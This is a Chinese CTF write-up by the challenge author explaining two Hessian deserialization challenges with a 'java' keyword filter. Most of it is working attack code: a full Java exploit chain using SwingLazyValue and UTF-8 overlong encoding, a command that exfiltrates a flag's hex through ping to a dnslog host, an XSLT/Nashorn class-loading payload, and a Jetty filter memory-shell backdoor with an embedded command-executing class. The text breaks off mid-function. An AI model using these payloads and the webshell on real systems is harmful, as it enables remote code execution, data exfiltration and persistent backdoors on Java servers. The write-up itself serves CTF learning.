## 前言
上回提到 ezCC 出了 `Commonscollections` 反序列化和 `Tomcat`，本着考的全面一点的策略，想着出一道差异化的 java 特性题，又因为平台限制出网所以出不了 `jndi`, `jdbc` 等类型的题目，所以最后出了道 `Hessian` 反序列化 + `Jetty` 内存马，这是 hdHessian 的原型。
因为感觉对新手颇有难度，所以几乎没做什么限制，并且把 Hessian 的版本降下来（去掉了反序列化的黑名单），再在平台开个出网（平台原因仅 DNS 流量能出），就成了 ezHessian。
在这基础上加上了'java' waf 是为了防止网上的 payload 直接 RCE，那样就没意思了，只是没想到 ezHessian 的解出数量也那么惨淡......~~java 学长下次再也不敢了~~

## 解
对于有亿点点 java 基础的人来说，拿到源码的时候应该就能判断出这是加了一个 waf 的 Hessian 反序列化接口。（再不济也能丢给 AI 解释
### 找反序列化链
Google 一下 `hessian 反序列化`，稍加探索便能发现这篇文章比较详细的讲解了 hessian 反序列化的利用，其中提到了 [Hessian JDK 原生反序列化](https://blog.wanghw.cn/security/hessian-deserialization-jdk-rce-gadget.html)，似乎和题目内容极度符合，exp 搬过来直接用，可以直接走通 `hessian2Input.readObject()` 接口 。
<img src="https://i.miji.bid/2025/05/10/2746a802f8881a4a63440309bb9d9bab.png" alt="2746a802f8881a4a63440309bb9d9bab.png" border="0">
但是 payload 放题里会被'java' waf 拦，那么现在的任务就成了在这个 payload 的基础，想办法 bypass waf。这里用到 `UTF-8 Overlong Encoding` 的 trick，考虑到这个确实需要一点积累，所以在第二天的时候直接放了 hint，这里用@X1roz 师傅的 [Hessian2OutputWithOverlongEncoding](https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/)。
但是尝试之后还是发现没法利用，排查后能发现问题出在 `unsafe.defineClass` 的 `bytecode` 内，`bytecode` 解码的内容包含了'java'，这部分无关 Hessian 反序列化，而是类的字节码，难以绕过'java'，只能另辟蹊径了。
payload 还是很有启发的，其中提到的 SwingLazyValue 已经能调用任意方法了，那么试试直接调用 `Runtime.exec`，这样可以绕过类字节码的逻辑。

```java
boolean isLinux = True;
SwingLazyValue execute = new SwingLazyValue(  
        MethodUtil.class.getName(),  
        "whatever",  
        new Object[]{  
                MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class),  
                new Object(),  
                new Object[]{  
                        Runtime.class.getDeclaredMethod("exec", String[].class),  
                        Runtime.getRuntime(),  
                        new Object[]{  
                                new String[]{  
                                        isLinux ? "sh" : "cmd",  
                                        isLinux ? "-c" : "/c",  
                                        "whatever"  
                                }  
                        }  
                }  
        }  
);
```
在本地测试后可以 RCE。但是远程碰到的核心问题就是怎么得到回显，一般的思路是先判断是否出网，能出网那便一切顺利，不然就要考虑其他的回显方式，测信道，内存马等方法（后面要考）。
### RCE 利用
但是因为平台的限制，无法直接弹 shell，但是 DNS 流量是出网的，可以利用 DNS 的方式回显命令执行的结果，这个命令也是文章里现有的。。。这里有个坑点，alpine 的镜像没有 `curl`，可以使用 `ping` 或 `wget`
```sh
echo "$(/readflag give me the flag | xxd -p -c 256 | sed 's/^\(.\{50\}\).*$/\1/').dnslog" | xargs ping
```
### 回顾
ezHessian 到这就结束了，可以看到需要写的并不多，大部分的代码都是网上现成的，真正要改的就是 encode 和 runtime rce 的部分，只有这么点解确实是没想到的，而且也没什么人给 🔨 提问。

### 内存马
hdHessian 中使用的是新版本的 Hessian，它在反序列化的过程中对 Runtime ProcessImpl 等类做了黑名单限制，因此无法直接 RCE 了，让我们重新把目光聚集在 `SwingLazyValue` 调用类加载上，（这里新手可能会疑惑为什么使用类加载能够过 Hessian 的黑名单，通俗来说，因为类字节码的加载使用 ClassLoader.defineClass，而 Hessian 反序列化只可见 ClassLoader，因此无法限制类加载时期在 ClassLoader 内的 Runtime）
前面提到类字节码会包含'java'字样，那么我们可以尝试先将字节码编码并保存为文件，然后第二次在对文件进行解码并加载。
实际上解码并加载字节码已经需要有任意代码执行的能力了，之后的利用可能需要一定的积累或搜索能力，笔者提供几种思路。
- 用 jni 的思路 `JavaUtils.writeBytesToFilename` 写一个.so 共享库，再用 `System.load` 加载，可以 RCE，但是要打内存马比较困难
- 用 `Files.write` 拼接一个 jar，然后用第一种方法打 agent 内存马 (未验证)
- 低版本 jdk 可以直接用 `JavaWrapper._main` 使用 BCEL 类加载器
- `JavaUtils.writeBytesToFilename` 写 xslt 文件，然后使用 `com.sun.org.apache.xalan.internal.xslt.Process._main` 加载

这里提供 xslt 的 payload
```java
package org.example;  
  
import com.caucho.hessian.io.Hessian2Input;  
import com.caucho.hessian.io.Hessian2Output;  
  
import sun.misc.BASE64Decoder;  
import sun.reflect.ReflectionFactory;  
import sun.reflect.misc.MethodUtil;  
  
import sun.swing.SwingLazyValue;  
  
import javax.activation.MimeTypeParameterList;  
  
import javax.swing.*;  
  
import java.io.*;  
  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.lang.reflect.Method;  
import java.net.HttpURLConnection;  
import java.net.URL;  
import java.net.URLEncoder;  
import java.util.Base64;  
import java.util.TreeMap;  
import java.util.TreeSet;  
import java.lang.String;  
  
  
/**  
 * whatever equals * MultiUIDefaults toString * UIDefaults get * SwingLazyValue createValue * rce */  
public class App {  
    static boolean isLinux = true;  
    static String tmpPath = isLinux ? "/tmp/" : "C:\\Windows\\Temp\\";  
    static String evilPath = tmpPath + "evil.xslt";  
    static String template = "yourProject\\src\\main\\misc\\template.xslt";  
    static String evilClass = "yourProject\\target\\classes\\JettyFilterMemoryShell.class";  
    static String filterClass = "yourProject\\target\\classes\\JettyFilter.class";  
    static String targetURL ="http://127.0.0.1:8080";  
    static Base64.Encoder encoder = Base64.getEncoder();  
  
  
    public static void main(String[] args) throws Exception {  
        // read memory shell bytes  
        FileInputStream fis = new FileInputStream(evilClass);  
        byte[] evilBytes = new byte[fis.available()];  
        fis.read(evilBytes);  
        fis.close();  
  
        fis = new FileInputStream(filterClass);  
        byte[] filterClass = new byte[fis.available()];  
        fis.read(filterClass);  
        fis.close();  
        System.out.println(new String(encoder.encode(filterClass)));  
  
        // write evil bytes to template  
        fis = new FileInputStream(template);  
        byte[] templateBytes = new byte[fis.available()];  
        fis.read(templateBytes);  
        fis.close();  
  
        // base64 encoded classBytes to bypass 'java' waf  
        byte[] evilXSLT = new String(templateBytes)  
                        .replace("<payload>", new String(encoder.encode(evilBytes)))  
                        .getBytes();  
  
        // define SwingLazyValue payload to send  
        SwingLazyValue writeFile = new SwingLazyValue(  
                "com.sun.org.apache.xml.internal.security.utils.JavaUtils",  
                "writeBytesToFilename",  
                new Object[]{  
                        evilPath,  
                        evilXSLT  
                }  
        );  
  
        SwingLazyValue execute = new SwingLazyValue(  
                MethodUtil.class.getName(),  
                "whatever",  
                new Object[]{  
                        MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class),  
                        new Object(),  
                        new Object[]{  
                                Runtime.class.getDeclaredMethod("exec", String[].class),  
                                Runtime.getRuntime(),  
                                new Object[]{  
                                        new String[]{  
                                                isLinux ? "sh" : "cmd",  
                                                isLinux ? "-c" : "/c",  
                                                "whatever"  
                                        }  
                                }  
                        }  
                }  
        );  
  
        SwingLazyValue runXSLT = new SwingLazyValue(  
                "com.sun.org.apache.xalan.internal.xslt.Process",  
                "_main",  
                new Object[]{new String[]{"-XT", "-XSL", evilPath}}  
        );  
  
  
        Object o1 = makePayload(writeFile);  
//        Object o2 = makePayload(execute);  
        Object o3 = makePayload(runXSLT);  
  
        String payload1 = convertPayload(o1);  
//        String payload2 = convertPayload(o2);  
        String payload3 = convertPayload(o3);  
  
//        testObject(payload2);  
  
        System.out.println(sendPost(targetURL, "ser", payload1));  
//        System.out.println(sendPost(targetURL, "ser", payload2));  
        System.out.println(sendPost(targetURL, "ser", payload3));  
        System.out.println(sendPost(targetURL, "cmd", "ls"));  
  
  
    }  
  
    public static String convertPayload(Object o) throws IOException {  
        ByteArrayOutputStream baos = new ByteArrayOutputStream();  
        Hessian2Output hessian2Output = new Hessian2OutputWithOverlongEncoding(baos);  
        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);  
  
        hessian2Output.writeObject(o);  
        hessian2Output.flush();  
        byte[] bytes = baos.toByteArray();  
        return new String(encoder.encode(bytes));  
    }  
  
    public static void testObject(String payload) {  
        try {  
            byte[] bytes = new BASE64Decoder().decodeBuffer(payload);  
            ByteArrayInputStream bais = new ByteArrayInputStream(bytes);  
            Hessian2Input hessian2Input = new Hessian2Input(bais);  
            Object o = hessian2Input.readObject();  
            System.out.println(o);  
        } catch (Exception e) {  
            e.printStackTrace();  
        }  
    }  
  
    public static Object makePayload(SwingLazyValue swingLazyValue) throws Exception {  
        UIDefaults uiDefaults = new UIDefaults();  
        uiDefaults.put("test", swingLazyValue);  
  
        MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();  
        setFieldValue(mimeTypeParameterList, "parameters", uiDefaults);  
  
        Constructor typeConstructor = Class.forName("javax.sound.sampled.AudioFileFormat$Type").getConstructor(String.class, String.class);  
        typeConstructor.setAccessible(true);  
        Object type = typeConstructor.newInstance("", "");  
        setFieldValue(type, "name", null);  
  
        Object rdnEntry1 = newInstance("javax.naming.ldap.Rdn$RdnEntry", null);  
        Object rdnEntry2 = newInstance("javax.naming.ldap.Rdn$RdnEntry", null);  
        setFieldValue(rdnEntry1, "type", "");  
        setFieldValue(rdnEntry1, "value", mimeTypeParameterList);  
        setFieldValue(rdnEntry2, "type", "");  
        setFieldValue(rdnEntry2, "value", type);  
  
        // make mimeTypeParameterList before Type  
        TreeSet treeSet = makeTreeSet(rdnEntry1, rdnEntry2);  
        return treeSet;  
    }  
  
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {  
        final Field field = getField(obj.getClass(), fieldName);  
        field.set(obj, value);  
    }  
  
    public static Field getField(final Class<?> clazz, final String fieldName) throws Exception {  
        try {  
            Field field = clazz.getDeclaredField(fieldName);  
            if (field != null)  
                field.setAccessible(true);  
            else if (clazz.getSuperclass() != null)  
                field = getField(clazz.getSuperclass(), fieldName);  
            return field;  
        } catch (NoSuchFieldException e) {  
            if (!clazz.getSuperclass().equals(Object.class)) {  
                return getField(clazz.getSuperclass(), fieldName);  
            }  
            throw e;  
        }  
    }  
  
    public static Object newInstance(String className, Object... args) throws Exception {  
        Class<?> clazz = Class.forName(className);  
        if (args != null) {  
            Class<?>[] argTypes = new Class[args.length];  
            for (int i = 0; i < args.length; i++) {  
                argTypes[i] = args[i].getClass();  
            }  
            Constructor constructor = clazz.getDeclaredConstructor(argTypes);  
            constructor.setAccessible(true);  
            return constructor.newInstance(args);  
        } else {  
            Constructor constructor = clazz.getDeclaredConstructor();  
            constructor.setAccessible(true);  
            return constructor.newInstance();  
        }  
    }  
  
    public static TreeSet makeTreeSet(Object o1, Object o2) throws Exception {  
        TreeMap m = new TreeMap();  
        setFieldValue(m, "size", 2);  
        setFieldValue(m, "modCount", 2);  
        Class nodeC = Class.forName("java.util.TreeMap$Entry");  
        Constructor nodeCst = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);  
        nodeCst.setAccessible(true);  
        Object node = nodeCst.newInstance(o1, new Object[0], null);  
        Object right = nodeCst.newInstance(o2, new Object[0], node);  
        setFieldValue(node, "right", right);  
        setFieldValue(m, "root", node);  
        TreeSet set = new TreeSet();  
        setFieldValue(set, "m", m);  
        return set;  
    }  
  
    public static String joinPath(String... paths) {  
        StringBuilder finalPath = new StringBuilder();  
        for (String path : paths) {  
            if (isLinux) {  
                finalPath.append("/").append(path);  
            } else {  
                finalPath.append("\\").append(path);  
            }  
        }  
        return finalPath.toString();  
    }  
  
    public static String sendPost(String urlStr, String paramName, String paramValue) throws IOException {  
        URL url = new URL(urlStr);  
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();  
  
        connection.setRequestMethod("POST");  
        connection.setDoOutput(true);  
  
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");  
  
        String urlParameters = paramName + "=" + URLEncoder.encode(paramValue, "UTF-8");  
  
        try (DataOutputStream out = new DataOutputStream(connection.getOutputStream())) {  
            out.writeBytes(urlParameters);  
            out.flush();  
        }  
  
        int responseCode = connection.getResponseCode();  
  
        StringBuilder response = new StringBuilder();  
        try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {  
            String inputLine;  
            while ((inputLine = in.readLine()) != null) {  
                response.append(inputLine);  
            }  
        }  
  
        return "Response Code: " + responseCode + "\n" + "Response: " + response;  
    }  
}
```

```xml
<!-- template.xslt 这里的java 使用了html实体编码 -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"  
                xmlns:sem="http://xml.apache.org/xalan/ja&#x76;a/ja&#x76;ax.script.ScriptEngineManager"                xmlns:se="http://xml.apache.org/xalan/ja&#x76;a/ja&#x76;ax.script.ScriptEngine">  
  
    <xsl:template match="/"><!--        <xsl:variable name="unsafeClass" select="ja&#x76;a:ja&#x76;a.lang.Class.forName('sun.misc.Unsafe')"/>-->  
<!--        <xsl:variable name="theUnsafeField" select="cl:getDeclaredField($unsafeClass, 'theUnsafe')"/>-->  
<!--        <xsl:&#x76;alue-of select="filed:setAccessible($theUnsafeField, true())"/>-->  
<!--        <xsl:variable name="unsafeInstance" select="filed:get($theUnsafeField, $unsafeClass)"/>-->  
<!--        <xsl:variable name="test" select="unsafe:staticFieldBase($unsafeInstance,$unsafeClass)"/>-->  
<!--        <xsl:variable name="rce" select="unsafe:defineClass($unsafeInstance,'JettyMemoryShell',$bs,0,ja&#x76;a:ja&#x76;a.lang.Integer.&#x76;alueOf(ja&#x76;a:ja&#x76;a.lang.reflect.Array.getLength($bs)),$cl,null)"/>-->  
<!--        <xsl:&#x76;alue-of select="$rce"/>-->  
        <xsl:variable name="engineobject" select="sem:new()"/>  
        <xsl:variable name="jsobject" select="sem:getEngineByName($engineobject,'nashorn')"/>        <xsl:variable name="out" select="se:e&#x76;al($jsobject,'var thread = ja&#x76;a.lang.Thread.currentThread();var classLoader = thread.getContextClassLoader();ja&#x76;a.lang.System.out.println(classLoader);try{classLoader.loadClass(&quot;org.apache.commons.qx.SOAPUtils&quot;).newInstance();}catch (e){var clsString = classLoader.loadClass(&quot;ja&#x76;a.lang.String&quot;);var bytecodeBase64 = &quot;<payload>&quot;;var bytecode;try{var clsBase64 = classLoader.loadClass(&quot;ja&#x76;a.util.Base64&quot;);var clsDecoder = classLoader.loadClass(&quot;ja&#x76;a.util.Base64$Decoder&quot;);bytecode = ja&#x76;a.util.Base64.getDecoder().decode(bytecodeBase64);} catch (ee) {try {var datatypeCon&#x76;erterClz = classLoader.loadClass(&quot;ja&#x76;ax.xml.bind.DatatypeCon&#x76;erter&quot;);bytecode = datatypeCon&#x76;erterClz.getMethod(&quot;parseBase64Binary&quot;, clsString).in&#x76;oke(datatypeCon&#x76;erterClz, bytecodeBase64);} catch (eee) {var clazz1 = classLoader.loadClass(&quot;sun.misc.BASE64Decoder&quot;);bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);}}var clsClassLoader = classLoader.loadClass(&quot;ja&#x76;a.lang.ClassLoader&quot;);var clsByteArray = (new ja&#x76;a.lang.String(&quot;a&quot;).getBytes().getClass());var clsInt = ja&#x76;a.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(&quot;defineClass&quot;, [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.in&#x76;oke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();}')"/>  
        <xsl:value-of select="$out"/>    </xsl:template></xsl:stylesheet>
```
至于 Jetty 的内存马，这里不过多赘述，网上随便找篇分析文章就行
```java
import java.io.ByteArrayInputStream;  
import java.io.ByteArrayOutputStream;  
import java.io.IOException;  
import java.io.PrintStream;  
import java.lang.reflect.Array;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.lang.reflect.InvocationTargetException;  
import java.lang.reflect.Method;  
import java.util.ArrayList;  
import java.util.List;  
import java.util.zip.GZIPInputStream;  
  
public class JettyFilterMemoryShell {  
    public JettyFilterMemoryShell() {  
        try {  
            /*  
            byte [] bytes = {12,23}; // what ever you want            Unsafe unsafe = Unsafe.getUnsafe();            unsafe.defineAnonymousClass(this.getClass(), bytes, new Object [0]).newInstance();            */  
            for(Object context : this.getContext()) {  
                Object filter = this.getShell(context);  
                this.inject(context, filter);  
            }  
        } catch (Exception e) {  
            e.printStackTrace();  
        }  
  
    }  
  
    public String getUrlPattern() {  
        return "/*";  
    }  
  
    public String getClassName() {  
        return "org.eclipse.jetty.servlet.handlers.XXRGa.OAuthFilter";  
    }  
  
    public String getBase64String() throws IOException {  
        return "yv66vgAAADQAtgoAJwBjBwBkBwBlCABmCwBnAGgHAGkIAGoIAGsIAGwKAG0AbgoAbQBvCgBwAHEHAHIKAA0AcwgAdAoADQB1CgANAHYKAA0AdwgAeAgAeQsAAwB6CwADAHsKAHwAfQoAfAB+CgB8AH8HAIALAAMAgQcAggoAHABjCACDCgAcAIQKABoAhQoAHACGCwCHAIgIAIkIAIoLAAMAiwcAjAcAjQcAjgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQANTEpldHR5RmlsdGVyOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAI8BAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAZpc1VuaXgBAAFaAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQASTGphdmEvbGFuZy9TdHJpbmc7AQADb3V0AQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEAB3JlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAVjaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAC2h0dHBSZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAMaHR0cFJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEADVN0YWNrTWFwVGFibGUHAGQHAGUHADsHAJAHAHIHAGkHAIwHAJEHAJIHAJMHAIAHAJQBAAdkZXN0cm95AQAHc2V0TmFtZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAEbmFtZQEAClNvdXJjZUZpbGUBABBKZXR0eUZpbHRlci5qYXZhDAApACoBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAANjbWQHAJEMAJUAXwEAEGphdmEvbGFuZy9TdHJpbmcBAAJzaAEAAi1jAQACL2MHAJYMAJcAmAwAmQCaBwCbDACcAJ0BABFqYXZhL3V0aWwvU2Nhbm5lcgwAKQCeAQACXGEMAJ8AoAwAoQCiDACjAKQBAAABABh0ZXh0L3BsYWluO2NoYXJzZXQ9VVRGLTgMAKUApgwApwCoBwCpDACqAKYMAKsAKgwArAAqAQATamF2YS9pby9JT0V4Y2VwdGlvbgwArQCuAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBABTlkb3ku6TmiafooYzplJnor686IAwArwCwDACxAKQMALIApAcAkwwANgCzAQAOWC1Qcm9jZXNzZWQtQnkBABFTaW1wbGVKZXR0eUZpbHRlcgwAtAC1AQALSmV0dHlGaWx0ZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lucHV0U3RyZWFtAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAE2phdmEvbGFuZy9UaHJvd2FibGUBAAxnZXRQYXJhbWV0ZXIBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAA5zZXRDb250ZW50VHlwZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BAAVmbHVzaAEABWNsb3NlAQAJc2V0U3RhdHVzAQAEKEkpVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACmdldE1lc3NhZ2UBAAh0b1N0cmluZwEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAAlzZXRIZWFkZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KVYAIQAmACcAAQAoAAAABQABACkAKgABACsAAAAvAAEAAQAAAAUqtwABsQAAAAIALAAAAAYAAQAAAAsALQAAAAwAAQAAAAUALgAvAAAAAQAwADEAAgArAAAANQAAAAIAAAABsQAAAAIALAAAAAYAAQAAABAALQAAABYAAgAAAAEALgAvAAAAAAABADIAMwABADQAAAAEAAEANQABADYANwACACsAAAKRAAUADQAAARcrwAACOgQswAADOgUrEgS5AAUCAMYA3AQ2BhUGmQAfBr0ABlkDEgdTWQQSCFNZBSsSBLkABQIAU6cAHAa9AAZZAxIEU1kEEglTWQUrEgS5AAUCAFM6B7gAChkHtgALtgAMOgi7AA1ZGQi3AA4SD7YAEDoJGQm2ABGZAAsZCbYAEqcABRITOgoZBRIUuQAVAgAZBbkAFgEAOgsZCxkKtgAXGQu2ABgZC7YAGbE6BhkFEhS5ABUCABkFEQH0uQAbAgAZBbkAFgEAOgcZB7sAHFm3AB0SHrYAHxkGtgAgtgAftgAhtgAXGQe2ABgZB7YAGbEtKyy5ACIDABkFEiMSJLkAJQMApwATOgwZBRIjEiS5ACUDABkMv7EAAwAXAKoAqwAaAPAA+AEGAAABBgEIAQYAAAADACwAAAByABwAAAAUAAYAFQAMABgAFwAaABoAGwBWABwAYwAdAHMAHgCHACEAkAAiAJkAIwCgACQApQAlAKoAKACrACkArQArALYALADAAC0AyQAuAOUALwDqADAA7wAxAPAANwD4ADoBAwA7AQYAOgETADsBFgA8AC0AAACOAA4AGgCRADgAOQAGAFYAVQA6ADsABwBjAEgAPAA9AAgAcwA4AD4APwAJAIcAJABAAEEACgCZABIAQgBDAAsAyQAnAEIAQwAHAK0AQwBEAEUABgAAARcALgAvAAAAAAEXAEYARwABAAABFwBIAEkAAgAAARcASgBLAAMABgERAEwATQAEAAwBCwBOAE8ABQBQAAAARAAI/gA7BwBRBwBSAVgHAFP+AC4HAFMHAFQHAFVBBwBW/wAlAAYHAFcHAFgHAFkHAFoHAFEHAFIAAQcAW/sARFUHAFwPADQAAAAGAAIAGgA1AAEAXQAqAAEAKwAAACsAAAABAAAAAbEAAAACACwAAAAGAAEAAABBAC0AAAAMAAEAAAABAC4ALwAAAAEAXgBfAAEAKwAAADYAAQACAAAAAiuwAAAAAgAsAAAABgABAAAAQwAtAAAAFgACAAAAAgAuAC8AAAAAAAIAYABBAAEAAQBhAAAAAgBi";  
    }  
  
    public void inject(Object context, Object filter) throws Exception {  
  
        Object servletHandler = getFieldValue(context, "_servletHandler");  
        if (servletHandler != null) {  
            if (this.isInjected(servletHandler)) {  
                PrintStream var9 = System.out;  
                String var10 = "filter is already injected";  
            } else {  
                Class<?> filterHolderClass = null;  
  
                try {  
                    filterHolderClass = context.getClass().getClassLoader().loadClass("org.eclipse.jetty.servlet.FilterHolder");  
                } catch (ClassNotFoundException var7) {  
                    filterHolderClass = context.getClass().getClassLoader().loadClass("org.mortbay.jetty.servlet.FilterHolder");  
                }  
  
                Constructor<?> constructor = filterHolderClass.getConstructor(Class.class);  
                Object filterHolder = constructor.newInstance(filter.getClass());  
                invokeMethod(filterHolder, "setName", new Class[]{String.class}, new Object[]{this.getClassName()});  
                invokeMethod(servletHandler, "addFilterWithMapping", new Class[]{filterHolderClass, String.class, Integer.TYPE}, new Object[]{filterHolder, this.getUrlPattern(), 1});  
                this.moveFilterToFirst(servletHandler);  
                invokeMethod(servletHandler, "invalidateChainsCache");  
                PrintStream var10000 = System.out;  
                String var10001 = "filter added successfully";  
            }  
        }  
    }  
  
    private void moveFilterToFirst(Object servletHandler) throws Exception {  
        Object filterMaps = getFieldValue(servletHandler, "_filterMappings");  
        ArrayList<Object> reorderedFilters = new ArrayList();  
        if (filterMaps.getClass().isArray()) {  
            int filterLength = Array.getLength(filterMaps);  
  
            for(int i = 0; i < filterLength; ++i) {  
                Object filter = Array.get(filterMaps, i);  
                String filterName = (String)getFieldValue(filter, "_filterName");  
                if (filterName.equals(this.getClassName())) {  
                    reorderedFilters.add(0, filter);  
                } else {  
                    reorderedFilters.add(filter);  
                }  
            }  
  
            for(int i = 0; i < filterLength; ++i) {  
                Array.set(filterMaps, i, reorderedFilters.get(i));  
            }  
        } else {  
            if (!(filterMaps instanceof ArrayList)) {  
                throw new IllegalArgumentException("filterMaps must be either an array or an ArrayList");  
            }  
  
            ArrayList<Object> filterList = (ArrayList)filterMaps;  
            int filterLength = filterList.size();  
  
            for(Object filter : filterList) {  
                String filterName = (String)getFieldValue(filter, "_filterName");  
                if (filterName.equals(this.getClassName())) {  
                    reorderedFilters.add(0, filter);  
                } else {  
                    reorderedFilters.add(filter);  
                }  
            }  
  
            filterList.clear();  
            filterList.addAll(reorderedFilters);  
        }  
  
    }  
  
    private List<Object> getContext() {  
        List<Object> contexts = new ArrayList();  
        Thread[] threads = (Thread[])Thread.getAllStackTraces().keySet().toArray(new Thread[0]);  
  
        for(Thread thread : threads) {  
            try {  
                Object contextClassLoader = invokeMethod(thread, "getContextClassLoader");  
                if (contextClassLoader.getClass().getName().contains("WebAppClassLoader")) {  
                    Object context = getFieldValue(contextClassLoader, "_context");  
                    Object handler = getFieldValue(context, "_servletHandler");  
                    contexts.add(getFieldValue(handler, "_contextHandler"));  
                } else {  
                    Object threadLocals = getFieldValue(thread, "threadLocals");  
                    Object table = getFieldValue(threadLocals, "table");  
  
                    for(int i = 0; i < Array.getLength(table); ++i) {  
                        Object entry = Array.get(table, i);  
                        if (entry != null) {  
                            Object httpConnection = getFieldValue(entry, "value");  
                            if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {  
                                Object httpChannel = invokeMethod(httpConnection, "getHttpChannel");  
                                Object request = invokeMethod(httpChannel, "getRequest");  
                                Object session = invokeMethod(request, "getSession");  
                                Object servletContext = invokeMethod(session, "getServletContext");  
                                contexts.add(getFieldValue(servletContext, "this$0"));  
                            }  
                        }  
                    }  
                }  
            } catch (Exception var17) {  
            }  
        }  
  
        return contexts;  
    }  
  
    private Object getShell(Object context) throws Exception {  
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();  
        if (classLoader == null) {  
            classLoader = context.getClass().getClassLoader();  
        }  
  
        try {  
            return classLoader.loadClass(this.getClassName()).newInstance();  
        } catch (Exception var7) {  
            byte[] clazzByte = (decodeBase64(this.getBase64String()));  
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);  
            defineClass.setAccessible(true);  
            Class<?> clazz = (Class)defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);  
            return clazz.newInstance();  
        }  
    }  
  
    public boolean isInjected(Object servletHandler) throws Exception {  
        Object filterMappings = getFieldValue(servletHandler, "_filterMappings");  
        if (filterMappings == null) {  
            return false;  
        } else {  
            Object[] filterMaps = new Object[0];  
            if (filterMappings instanceof List) {  
                filterMaps = ((List)filterMappings).toArray();  
            } else if (filterMappings instanceof Object[]) {  
                filterMaps = (Object[]) filterMappings;  
            }  
  
            for(Object filterMap : filterMaps) {  
                Object filterName = getFieldValue(filterMap, "_filterName");  
                if (filterName.equals(this.getClassName())) {  
                    return true;  
                }  
            }  
  
            return false;  
        }  
    }  
  
    public static byte[] decodeBase64(String base64Str) throws Exception {  
        try {  
            Class<?> decoderClass = Class.forName("java.util.Base64");  
